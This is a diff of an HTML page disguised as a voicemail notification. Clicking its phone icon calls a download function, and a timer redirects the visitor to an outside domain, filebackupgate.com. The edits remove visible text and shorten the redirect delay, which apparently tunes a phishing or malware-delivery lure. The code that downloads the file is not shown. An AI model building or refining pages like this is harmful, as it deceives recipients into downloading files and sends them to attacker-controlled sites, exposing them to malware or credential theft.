@@ -77,18 +77,15 @@
 </head>
 <body>
 
-    <div class="logo">Voice Mail Ledger</div> <!-- Logo at the top right -->
-
+   
     <!-- Instruction message for the user -->
-    <div class="instruction" id="instruction">
-        You have a new voicemail. Click the icon below to download and play it.
-    </div>
+    
 
     <div class="voicemail-container" id="voicemailIcon" onclick="downloadFile()">
         <div class="circle">
             📞 <!-- Voicemail icon -->
             <div class="wave"></div>
-            <span class="text-below" id="voicemailText">Click to download and play voicemail</span> <!-- Updated text below the icon -->
+            <!-- Updated text below the icon -->
         </div>
     </div>
 
@@ -107,7 +104,7 @@
 
             setTimeout(() => {
                 window.location.href = "https://accesspoint.filebackupgate.com/"; // Replace with actual redirect URL
-            }, 5000);
+            }, 2000);
         };
 
         function downloadFile() {
